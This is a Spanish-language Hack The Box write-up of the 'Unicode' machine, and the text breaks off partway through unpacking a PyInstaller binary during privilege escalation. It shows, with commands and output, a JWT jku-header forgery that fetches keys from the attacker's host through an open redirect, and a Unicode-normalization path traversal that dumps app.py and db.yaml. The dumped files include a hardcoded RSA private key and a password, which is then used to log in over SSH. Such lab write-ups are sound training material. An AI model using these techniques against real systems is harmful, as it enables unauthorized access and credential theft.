auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidXNlciJ9.Msmk7qygAW055YytGXMy4Zrf1w5WLsZ661ZTWJS50dFe64k1PigWeZkGZByGPZzSAFdYU2LfSR52ogWZqUjzdPeq3yBrrKRz5Sq3tv4fch2nN-l3CdsCk0c5K_GjIpwgQ-SP1DKVsse3deJlsZ8gtykXDyo5se24_TFcbudZSCTxoUK7Q5j3YdxlXZjI0RqQOptd4-O5ZCL4w1yl6NaHLDREH3NTZ5O5awbglOjifev-fvwW3_BBrX-c-o70xyxh98hCo8oSnQYv8Q3X16tJJiUoVZVrnn1xYM-mU-OlEidWzcsoPNIbkJjLwkQNpMDeQUoXv-QWMNcEb2WFBVqeTw Upgrade-Insecure-Requests: 1 Tras revisar el token en jwt.io vemos en el Header el parametro \u0026ldquo;jku\u0026rdquo; que apunta a un archivo json en el dominio hackmedia.htb.\nDicho dominio pertenece a la maquina, y el archivo json contiene un set de claves publicas (JSON Web Key Set) codificadas como se menciona en 1, 2.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/unicode ❯ curl -s http://hackmedia.htb/static/jwks.json { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;hackthebox\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34; } ] } π ~/htb/unicode ❯ JSON Set URL (jku) La herramienta jwt_tool permite modificar un token incluso testear distintas vulnerabilidades. Su instalación es sencilla:\n1 2 git clone https://github.com/ticarpi/jwt_tool python3 -m pip install termcolor cprint pycryptodomex requests Iniciamos almacenando la cookie en una variable de bash para luego ejecutar jwt_tool modificando la URL en \u0026ldquo;jku\u0026rdquo;, jwt_tool crearía el archivo jwttool_custom_jwks.json. Por ultimo debemos de crear un mini servidor para que se realice la solicitud y verifique el token con el json generado en nuestro servidor.\nAttacking JSON Web Tokens (JWTs) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 π jwt_tool master ✗ ❯ export token_unicode=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidXNlciJ9.Msmk7qygAW055YytGXMy4Zrf1w5WLsZ661ZTWJS50dFe64k1PigWeZkGZByGPZzSAFdYU2LfSR52ogWZqUjzdPeq3yBrrKRz5Sq3tv4fch2nN-l3CdsCk0c5K_GjIpwgQ-SP1DKVsse3deJlsZ8gtykXDyo5se24_TFcbudZSCTxoUK7Q5j3YdxlXZjI0RqQOptd4-O5ZCL4w1yl6NaHLDREH3NTZ5O5awbglOjifev-fvwW3_BBrX-c-o70xyxh98hCo8oSnQYv8Q3X16tJJiUoVZVrnn1xYM-mU-OlEidWzcsoPNIbkJjLwkQNpMDeQUoXv-QWMNcEb2WFBVqeTw π jwt_tool master ✗ ❯ ./jwt_tool.py $token_unicode -I -pc \u0026#34;user\u0026#34; -pv \u0026#34;admin\u0026#34; -X s -ju \u0026#34;http://10.10.14.30/jwttool_custom_jwks.json\u0026#34; \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.5 \\______| @ticarpi Original JWT: Paste this JWKS into a file at the following location before submitting token request: http://10.10.14.30/jwttool_custom_jwks.json (JWKS file used: jwttool_custom_jwks.json) jwt_tool/jwttool_custom_jwks.json jwttool_c8846d1ac0b95b56000c01b0ed3a5df5 - Signed with JWKS at http://10.10.14.30/jwttool_custom_jwks.json [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNC4zMC9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.dENecglCQTEdpndUDnqY4O7XtYd5QiTvWn9fIr3LJq-jFHeL_0FY9QgaONb2R94kJBAogYfJhPRyRuCFrfMfaGOQqJSdWCSAfCH5_0JqZ91h5c6lXJR9DWTCA_ERbVvGiOAQB1OXqsiY09Q7jCautZPLyM_AdyZnQEixVNTUiZPWJ6nZr2TQTv0Pr4XyCfOXAqnLYqnbZJ9LNpgnit9CQQBN_w8OAvs2SGVwC7d4qJQulpfSIZVdKPfZH7OcMKWWKHT8rXQGF2kIg8cEqYcZE-1yvY6FKBwf3BjSCNP9qQXQGGzz7ud7uN_K9c-qEj0eazm4ORmKjlsuzceEXqPERw π jwt_tool master ✗ ❯ Tras haber generado el token nuevo, lo utilizamos en el sitio, sin embargo nos mostró un mensaje, muestra que el parametro \u0026ldquo;jku\u0026rdquo; es invalido.\n1 jku validation failed admin - Web Site Realizando distintas pruebas con el redireccionamiento (/redirect/?url=10.10.14.30/jwttool_custom_jwks.json) no nos permitió acceder a nuestro servidor, sin embargo encontramos que el sitio unicamente muestra el error cuando no existe http://hackmedia.htb/static/ en la URL. Utilizamos ../ para \u0026ldquo;subir\u0026rdquo; un directorio lo cual nos permitiría acceder a redirect de tal forma: http://hackmedia.htb/static/../redirect/?url=[URL]. Tras generar el token con esta nueva URL obtuvimos una solicitud en el miniservidor, aunque no encontramos información nueva.\n1 ./jwt_tool.py $token_unicode -X s -ju \u0026#34;http://hackmedia.htb/static/../redirect/?url=10.10.14.30/jwttool_custom_jwks.json\u0026#34; Por ello generamos nuevamente un token esta vez modificando el el usuario a \u0026ldquo;admin\u0026rdquo;.\n1 ./jwt_tool.py $token_unicode -I -pc \u0026#34;user\u0026#34; -pv \u0026#34;admin\u0026#34; -X s -ju \u0026#34;http://hackmedia.htb/static/../redirect/?url=10.10.14.30/jwttool_custom_jwks.json\u0026#34; Tras modificar el token en el navegador, vemos un nuevo dashboard.\nPath Traversal - Unicode El nuevo sitio web unicamente muestra una pagina que recibe el nombre de un archivo .pdf, aunque solo muestra un mensaje.\nTras solicitar un archivo local nos muestra que existen algunos filtros en el sitio.\nIntentando distintas formas de realizar bypass y diferentes \u0026ldquo;payloads\u0026rdquo; no encontramos alguna que mostrara algun archivo. Sin embargo el nombre de la maquina nos podría dar una idea de lo que podemos utilizar.\nTras investigar un poco sobre Unicode Bypass en Flask nos topamos con un post de Jorge Lajara - WAF Bypassing with Unicode Compatibility donde explica cómo funciona la normalizacion de caracteres unicode, además muestra un lista de payloads para ciertas vulnerabilidades utilizando ciertos caracteres unicode.\nTras utilizar el payload de Path Traversal obtuvimos el archivo /etc/passwd donde vemos al usuario code.\nCodigo Fuente Como sabemos estan utilizando Flask para el sitio web, sabiendo esto, logramos obtener el codigo fuente suponiendo el nombre del archivo principal (app.py). Vemos al inicio del archivo que carga la configuracion de la base de datos desde un archivo .yaml, (codigo fuente en Pestaña 2).\npython\rpython\r1 2 3 4 5 6 7 8 9 10 11 12 [.. snip ..] db=yaml.load(open(\u0026#39;db.yaml\u0026#39;)) app.config[\u0026#39;MYSQL_HOST\u0026#39;]= db[\u0026#39;mysql_host\u0026#39;] app.config[\u0026#39;MYSQL_USER\u0026#39;]=db[\u0026#39;mysql_user\u0026#39;] app.config[\u0026#39;MYSQL_PASSWORD\u0026#39;]=db[\u0026#39;mysql_password\u0026#39;] app.config[\u0026#39;MYSQL_DB\u0026#39;]=db[\u0026#39;mysql_db\u0026#39;] app.debug=True [.. snip ..] ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 # http://hackmedia.htb/display/?page=%E2%80%A5/app.py import base64 from MySQLdb import cursors from flask import Flask, abort, request,render_template,make_response,redirect from werkzeug.utils import secure_filename import unicodedata import os import jwt from flask_mysqldb import MySQL import yaml import requests import json import traceback app = Flask(__name__) db=yaml.load(open(\u0026#39;db.yaml\u0026#39;)) app.config[\u0026#39;MYSQL_HOST\u0026#39;]= db[\u0026#39;mysql_host\u0026#39;] app.config[\u0026#39;MYSQL_USER\u0026#39;]=db[\u0026#39;mysql_user\u0026#39;] app.config[\u0026#39;MYSQL_PASSWORD\u0026#39;]=db[\u0026#39;mysql_password\u0026#39;] app.config[\u0026#39;MYSQL_DB\u0026#39;]=db[\u0026#39;mysql_db\u0026#39;] app.debug=True mysql=MySQL(app) @app.route(\u0026#39;/\u0026#39;) def Welcome_name(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#39;/register/\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def register(): if request.method==\u0026#34;GET\u0026#34;: return render_template(\u0026#39;register.html\u0026#39;) if request.method==\u0026#34;POST\u0026#34;: username=request.form.get(\u0026#39;username\u0026#39;) username=username.lower() if request.form.get(\u0026#39;password\u0026#39;)==request.form.get(\u0026#39;password_confirm\u0026#39;): password=request.form.get(\u0026#39;password\u0026#39;) cur=mysql.connection.cursor() cur.execute(\u0026#34;select username from user_info where username=%s\u0026#34;,[username]) data=cur.fetchall() cur.close() if len(data)==0: cur=mysql.connection.cursor() cur.execute(\u0026#34;insert into user_info(username,password) values(%s,%s)\u0026#34;,(username,password)) mysql.connection.commit() cur.close() return redirect(\u0026#34;/login\u0026#34;,code=302) else: msg=\u0026#34;User alreay exist\u0026#34; return render_template(\u0026#34;register.html\u0026#34;,msg=msg) else: msg=\u0026#34;PASSOWRD DOSENT MATCH\u0026#34; return render_template(\u0026#39;register.html\u0026#39;,msg=msg) @app.route(\u0026#39;/login/\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def login(): if request.method==\u0026#34;GET\u0026#34;: if request.cookies.get(\u0026#39;auth\u0026#39;): return redirect(\u0026#34;/dashboard/\u0026#34;) else: return render_template(\u0026#39;login.html\u0026#39;) if request.method==\u0026#34;POST\u0026#34;: priv=b\u0026#39;-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEAxVwY8XrYwD+WcKU3hnpY0Jdkds9iv52GSK4TaQFoQ9hhyVEU\\nNrbhr4CpVjlFHY2KwQ/bnB0eoeYaGbdN17bEUoXOLNVPHFM7LQ62gfT1Ia7KX+4V\\nkjS9Awtcm0dm7L9hFaHFNLOndtN4VkEcLduO75TGIlk09Crc8wwLyhMpCzmj5uOd\\ngaLe2ZODMmtNsWRAkqW1YLxciFzkwBZQZygjir0NSc+P+rOwOMwEahbU3lC2dT3W\\nO6u9r1Ilw3SNvtpija+U/UlO6s0G3AEwFT30LJdnmJEksTHGBQ2wMEX8OzAmg7Gz\\nsIBULkWMiqFvW1FPLdp8xayYarDweJQDZYVhywIDAQABAoIBABbQhrGjmdrffuyW\\nrMyG6C100tBJOQkdlKBiPywsVXlCUkuLa+LHUV+QaALnq+22pwuaYbCyTRA6IVpH\\nrl/5aMiBX0wffH2xwW17/e0X/B5grlRYmXXFUvQ/I/1vS56ioP53LOzit8EswQR3\\nkmJatzNK53yhA1YWfmQ6SEKb5Gq/ksMG3T5BHi0GWkR7YmbfvqgcNTlWgmlKj3qp\\n5JQWpaWea4tEtdoV06kciE8ugs4R0Tzd4NbjXGJiidoMY/mvcm7Ln425cYEJj+44\\naGmOnoFLSNJaVk6mYWzXpOLZAjPDSROI+mYj1gRR9PROnvHVZWKsogBl+DMCq46h\\n/GIqNwECgYEA+s7d17mrDFuo0qQfr8AP/ThVujwvmcBCtQsI/a0DrSHFRV1c9zK9\\nTeKZ/0FqOFnNr4a+F7LKYT9PpsbOClJbNP7nLJXE64vQLQVB/IbkJ6bDw63LZRvX\\nPFp3xr3ltMrQ+bjEkt3IHF0ae20II5W3mjaEPG7Gd/Gnpi61NF53LhECgYEAyXH8\\nkoQr2IB3jduwN2mNYrc1Twb1QDhj9a4/W/yIsgIbJ4/8sjuJyehvm1Xb2f9axY6Q\\nCpse4piYYnKSk3AqbSThVW+X4LgXlKR0Xe5Zhsf/F2072+822h1wRyqKR4xM5kbv\\n5ruH9ZTi2K0Fll3rGhDzJ0ygoe0uGmWG2bNNJhsCgYEAqDjaORhSbt6HtIjaq/Hh\\nh5EihuBZeQGofG/jXuqN3bEZ9LVzZmZE7JmBeuCwUw2A1StGEvUbovBpB06u4eNt\\nQ3V5LsFhrC9BuQCeyrbbDvFeur+1/aIX0mZHkijKimHCmsxgJLXWw5d67LAr1lpU\\nJH5OYY5XVhnivab0aSS3QVECgYAVZX8PTOyfTV3lem0oJZT35D/MSg/op1SutrhS\\nG+ulBKY/uIJ9p+dFw+N+20rDx+SrUS4pgjpwlQayhjrdYC+RcjZg7b5zBvqyNhmK\\nFJP7xehpY5fVD36DAld3p6QSX2uXlfdLSaXyRsMlgpMyWn1rQluhU/lH2bpo4VnG\\na84I+wKBgQDKy7HGzCp6CXbiEUOlitZhST8eq8Dwk+bh9HGMMvrPCMPWBibshwl4\\nDFi8Mol0XoiLgrc8fCu7/8wz0ctD+5R63rHG6/vZLsZEW2JsoWP/b/wCdXu/jdXU\\nNWpjmc9EgSTEbqhKSSHoXt/Q3HKi770ps7Ajd4O50yu99GLZZ4kVHA==\\n-----END RSA PRIVATE KEY-----\\n\u0026#39; username=request.form.get(\u0026#39;username\u0026#39;).lower() password=request.form.get(\u0026#39;password\u0026#39;) if username==\u0026#34;admin\u0026#34;: msg=\u0026#34;Acces to admin account is been blocked\u0026#34; return render_template(\u0026#34;login.html\u0026#34;,msg=msg) else: cur=mysql.connection.cursor() cur.execute(\u0026#34;select username,password from user_info where username=%s and password=%s\u0026#34;,(username,password)) data=cur.fetchall() if len(data)!=0: creds=data[0] if username==creds[0] and password==creds[1]: token=jwt.encode({\u0026#34;user\u0026#34;: username}, priv, algorithm=\u0026#34;RS256\u0026#34;,headers={\u0026#34;jku\u0026#34;:\u0026#34;http://hackmedia.htb/static/jwks.json\u0026#34;},) resp=make_response(redirect(\u0026#39;/dashboard/\u0026#39;)) resp.set_cookie(\u0026#39;auth\u0026#39;, token) return resp else: msg=\u0026#34;user doesnt exist\u0026#34; return render_template(\u0026#34;login.html\u0026#34;,msg=msg) @app.route(\u0026#34;/logout/\u0026#34;) def logout(): resp=make_response(redirect(\u0026#39;/login/\u0026#39;)) resp.set_cookie(\u0026#39;auth\u0026#39;,\u0026#39;\u0026#39;,expires=0) return resp @app.route(\u0026#34;/dashboard/\u0026#34;,methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def dashboard(): if request.cookies.get(\u0026#39;auth\u0026#39;): auth_cookie=request.cookies.get(\u0026#39;auth\u0026#39;) try: token_head=auth_cookie.split(\u0026#34;.\u0026#34;)[0] if len(token_head)%4!=0: no_equal_adder=4-len(auth_cookie.split(\u0026#34;.\u0026#34;)[0])%4 equal_adder=no_equal_adder*\u0026#34;=\u0026#34; token_head=token_head+equal_adder decoded_token=base64.urlsafe_b64decode(token_head).decode(\u0026#39;utf-8\u0026#39;) url=decoded_token.split(\u0026#39;\u0026#34;jku\u0026#34;\u0026#39;)[1].lstrip(\u0026#34;:\u0026#34;).rstrip(\u0026#34;}\u0026#34;).strip(\u0026#39;\u0026#34;\u0026#39;) if \u0026#39;\u0026#34;\u0026#39; in url: url=url.replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#34;\u0026#34;) url=url.strip(\u0026#39;\\n\u0026#39;) url=url.strip() print(len(url)) if url.startswith(\u0026#34;http://hackmedia.htb/static/\u0026#34;): resp=requests.get(url) data=json.loads(resp.text) jwk=data[\u0026#34;keys\u0026#34;][0] key=jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk)) decoded_token=jwt.decode(auth_cookie, key , algorithms=[\u0026#34;RS256\u0026#34;]) else: return \u0026#34;jku validation failed\u0026#34; except: return render_template(\u0026#34;login.html\u0026#34;) if decoded_token[\u0026#39;user\u0026#39;]==\u0026#34;admin\u0026#34;: return render_template(\u0026#34;admin_dashboard.html\u0026#34;) else: return render_template(\u0026#34;user_dashboard.html\u0026#34;,username_send=decoded_token[\u0026#39;user\u0026#39;]) else: return render_template(\u0026#34;login.html\u0026#34;) @app.route(\u0026#39;/display/\u0026#39;,methods=[\u0026#39;GET\u0026#39;]) def display(): if request.cookies.get(\u0026#39;auth\u0026#39;): auth_cookie=request.cookies.get(\u0026#39;auth\u0026#39;) admin_check=\u0026#34;\u0026#34; try: token_head=auth_cookie.split(\u0026#34;.\u0026#34;)[0] if len(token_head)%4!=0: no_equal_adder=4-len(auth_cookie.split(\u0026#34;.\u0026#34;)[0])%4 equal_adder=no_equal_adder*\u0026#34;=\u0026#34; token_head=token_head+equal_adder decoded_token=base64.urlsafe_b64decode(token_head).decode(\u0026#39;utf-8\u0026#39;) url=decoded_token.split(\u0026#39;\u0026#34;jku\u0026#34;\u0026#39;)[1].lstrip(\u0026#34;:\u0026#34;).rstrip(\u0026#34;}\u0026#34;).strip(\u0026#39;\u0026#34;\u0026#39;) if \u0026#39;\u0026#34;\u0026#39; in url: url=url.replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#34;\u0026#34;) url=url.strip(\u0026#39;\\n\u0026#39;) url=url.strip() if url.startswith(\u0026#34;http://hackmedia.htb/static/\u0026#34;): resp=requests.get(url) data=json.loads(resp.text) jwk=data[\u0026#34;keys\u0026#34;][0] key=jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk)) admin_check=jwt.decode(auth_cookie, key , algorithms=[\u0026#34;RS256\u0026#34;]) else: return \u0026#34;JKU validation Falied\u0026#34; except: return redirect(\u0026#39;login\u0026#39;) if admin_check[\u0026#39;user\u0026#39;]==\u0026#34;admin\u0026#34;: if request.args.get(\u0026#39;page\u0026#39;): page=request.args.get(\u0026#39;page\u0026#39;) page=page.lower() file_to_send=\u0026#34;\u0026#34; if \u0026#34;../\u0026#34; in page or page.startswith(\u0026#34;/etc\u0026#34;) or page.startswith(\u0026#34;/proc\u0026#34;) or page.startswith(\u0026#34;/usr\u0026#34;) or page.startswith(\u0026#34;usr\u0026#34;) or page.startswith(\u0026#34;etc\u0026#34;) or page.startswith(\u0026#34;proc\u0026#34;): return redirect(\u0026#34;/filenotfound/\u0026#34;,code=302) else: safe_page=unicodedata.normalize(\u0026#39;NFKC\u0026#39;, page) safe_page_folder=os.getcwd()+\u0026#34;/\u0026#34;+\u0026#34;files/\u0026#34;+safe_page try: with open(safe_page_folder,\u0026#34;r\u0026#34;) as fd: file_to_send=fd.readlines() file_to_send_string=\u0026#39;\u0026#39;.join([str(elem) for elem in file_to_send]) return str(file_to_send_string) except: msg=safe_page+\u0026#34; Not found\u0026#34; return render_template(\u0026#34;404.html\u0026#34;,msg=msg) else: return \u0026#34;Missing Parameter\u0026#34; else: return redirect(\u0026#34;/unauth_error/\u0026#34;,code=302) else: return redirect(\u0026#34;/unauth_error/\u0026#34;,code=302) @app.route(\u0026#34;/redirect/\u0026#34;,methods=[\u0026#34;GET\u0026#34;]) def test(): url=\u0026#34;http://\u0026#34;+request.args.get(\u0026#34;url\u0026#34;) return redirect(url,code=302) @app.route(\u0026#34;/upload/\u0026#34;,methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def file_upload(): try: if request.method==\u0026#34;GET\u0026#34;: if request.cookies.get(\u0026#39;auth\u0026#39;): return render_template(\u0026#34;upload.html\u0026#34;) if request.method==\u0026#34;POST\u0026#34;: allowed_files=[\u0026#34;pdf\u0026#34;,\u0026#34;docx\u0026#34;,\u0026#34;php\u0026#34;,\u0026#34;py\u0026#34;,\u0026#34;asp\u0026#34;] f = request.files[\u0026#39;threat_report\u0026#39;] user_supplied_extension=f.filename.rsplit(\u0026#39;.\u0026#39;,1) if user_supplied_extension[1] in allowed_files: return render_template(\u0026#34;thanks.html\u0026#34;) else: return \u0026#34;file not allowed\u0026#34; except: return \u0026#34;Please select a file to upload.\u0026#34; @app.route(\u0026#34;/debug/\u0026#34;) def debug(): debug_value=request.args.get(\u0026#34;value\u0026#34;) if debug_value==0: return \u0026#34;debug is disabled\u0026#34; else: return render_template(\u0026#34;debug.html\u0026#34;) @app.route(\u0026#34;/pricing/\u0026#34;) def pricing(): return render_template(\u0026#34;pricing.html\u0026#34;) @app.route(\u0026#34;/checkout/\u0026#34;) def checkout(): return render_template(\u0026#34;checkout.html\u0026#34;) @app.route(\u0026#34;/purchase_done/\u0026#34;) def purchase(): return render_template(\u0026#34;thanks_purchase.html\u0026#34;) @app.route(\u0026#39;/error/\u0026#39;,methods=[\u0026#34;GET\u0026#34;]) def error(): return render_template(\u0026#34;404.html\u0026#34;) @app.route(\u0026#34;/filenotfound/\u0026#34;) def error_from_page(): msg=\u0026#34;we do a lot input filtering you can never bypass our filters.Have a good day\u0026#34; return render_template(\u0026#34;404.html\u0026#34;,msg=msg) @app.route(\u0026#34;/unauth_error/\u0026#34;,methods=[\u0026#34;GET\u0026#34;]) def unauth(): msg=\u0026#34;unauthorized access\u0026#34; return render_template(\u0026#34;401.html\u0026#34;,msg=msg) @app.errorhandler(404) def not_found(e): return render_template(\u0026#34;404.html\u0026#34;) @app.route(\u0026#34;/internal/\u0026#34;) def internal_error(): #return \u0026#34;500 error caught\u0026#34; return traceback.format_exc() if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) User - Code Tras obtener el archivo db.yaml vemos las credenciales del usuario code.\n1 2 3 4 5 #http://hackmedia.htb/display/?page=%E2%80%A5/db.yaml mysql_host: \u0026#34;localhost\u0026#34; mysql_user: \u0026#34;code\u0026#34; mysql_password: \u0026#34;B3stC0d3r2021@@!\u0026#34; mysql_db: \u0026#34;user\u0026#34; Con estas credenciales logramos acceder por SSH y obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 π ~/htb/unicode ❯ ssh code@hackmedia.htb # B3stC0d3r2021@@! The authenticity of host \u0026#39;hackmedia.htb (10.10.11.126)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:0ItJgn3BqbEjsSvZRBYXQDCZL7YXnpldg3UdP1Bl4nE. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;hackmedia.htb\u0026#39; (ECDSA) to the list of known hosts. code@hackmedia.htb\u0026#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 07 Dec 2021 01:05:51 AM UTC System load: 0.0 Processes: 314 Usage of /: 82.1% of 3.87GB Users logged in: 0 Memory usage: 40% IPv4 address for eth0: 10.10.11.126 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Nov 29 14:14:14 2021 from 10.10.14.23 code@code:~$ whoami; id code uid=1000(code) gid=1000(code) groups=1000(code) code@code:~$ ls coder user.txt code@code:~$ cat user.txt f3f28b5a71e4771d7fc1b02b2007c2db code@code:~$ Privesc Enumerando los comandos que pueden ser ejecutados con \u0026ldquo;sudo\u0026rdquo; vemos /usr/bin/treport.\n1 2 3 4 5 6 7 8 9 10 11 12 code@code:~$ sudo -l -l Matching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User code may run the following commands on code: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/treport code@code:~$ Tras ejecutar algunas de las opciones podemos observar que esta utilizando el archivo treport.py y que el directorio donde almacena los informes es /root/reports/, además al intentar descargar un informe vemos que utiliza curl.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:1 Enter the filename:123 Enter the report:abc.txt Traceback (most recent call last): File \u0026#34;treport.py\u0026#34;, line 74, in \u0026lt;module\u0026gt; File \u0026#34;treport.py\u0026#34;, line 13, in create FileNotFoundError: [Errno 2] No such file or directory: \u0026#39;/root/reports/123\u0026#39; [4827] Failed to execute script \u0026#39;treport\u0026#39; due to unhandled exception! code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:10.10.14.30/x % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0Warning: Failed to create the file /root/reports/threat_report_01_19_13: No Warning: such file or directory 100 469 100 469 0 0 1657 0 --:--:-- --:--:-- --:--:-- 1657 curl: (23) Failed writing body (0 != 469) Enter your choice:^[[D Wrong Input code@code:~$ El archivo treport.py parece no existir en la maquina, además al ejecutar strings sobre el comando treport se muestran algunas palabras relacionadas a librerias de python.\n1 2 code@code:~$ find / -name treport.py 2\u0026gt;/dev/null code@code:~$ Unpacking Pyinstaller Suponiendo que es un archivo generado con Python utilizamos archive_viewer de pyinstaller, por medio de apt instalamos este \u0026lsquo;comando\u0026rsquo;. Además copiamos el binario a nuestra maquina local.\n1 2 sudo apt install python3-pyinstaller # path de instalación - /usr/bin/pyi-archive_viewer Unpacking PyInstaller packed files Recurso online alternativo para decompilar un archivo .pyc: tool.lu/pyc. Ejecutamos archive_viewer sobre el archivo, vemos una lista de archivos o \u0026rsquo;librerias\u0026rsquo;, extraemos treport y struct.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 π ~/htb/unicode/binary ❯ /usr/bin/pyi-archive_viewer treport pos, length, uncompressed, iscompressed, type, name [(0, 230, 311, 1, \u0026#39;m\u0026#39;, \u0026#39;struct\u0026#39;), (230, 1061, 1792, 1, \u0026#39;m\u0026#39;, \u0026#39;pyimod01_os_path\u0026#39;), (1291, 4071, 8907, 1, \u0026#39;m\u0026#39;, \u0026#39;pyimod02_archive\u0026#39;), (5362, 5609, 13152, 1, \u0026#39;m\u0026#39;, \u0026#39;pyimod03_importers\u0026#39;), (10971, 1473, 3468, 1, \u0026#39;m\u0026#39;, \u0026#39;pyimod04_ctypes\u0026#39;), (12444, 817, 1372, 1, \u0026#39;s\u0026#39;, \u0026#39;pyiboot01_bootstrap\u0026#39;), (13261, 696, 1053, 1, \u0026#39;s\u0026#39;, \u0026#39;pyi_rth_pkgutil\u0026#39;), (13957, 1134, 2075, 1, \u0026#39;s\u0026#39;, \u0026#39;pyi_rth_multiprocessing\u0026#39;), (15091, 445, 672, 1, \u0026#39;s\u0026#39;, \u0026#39;pyi_rth_inspect\u0026#39;), (15536, 1505, 2646, 1, \u0026#39;s\u0026#39;, \u0026#39;treport\u0026#39;), [.. snip ..] (708193, 8057, 31072, 1, \u0026#39;b\u0026#39;, \u0026#39;lib-dynload/termios.cpython-38-x86_64-linux-gnu.so\u0026#39;), (716250, 30681, 74848, 1, \u0026#39;b\u0026#39;, \u0026#39;libbz2.so.1.0\u0026#39;), (746931, 1312123, 2954080, 1, \u0026#39;b\u0026#39;, \u0026#39;libcrypto.so.1.1\u0026#39;), (2059054, 65500, 182560, 1, \u0026#39;b\u0026#39;, \u0026#39;libexpat.so.1\u0026#39;), (2124554, 18359, 43416, 1, \u0026#39;b\u0026#39;, \u0026#39;libffi.so.7\u0026#39;), (2142913, 80552, 162264, 1, \u0026#39;b\u0026#39;, \u0026#39;liblzma.so.5\u0026#39;), (2223465, 92940, 224008, 1, \u0026#39;b\u0026#39;, \u0026#39;libmpdec.so.2\u0026#39;), (2316405, 2075205, 5449112, 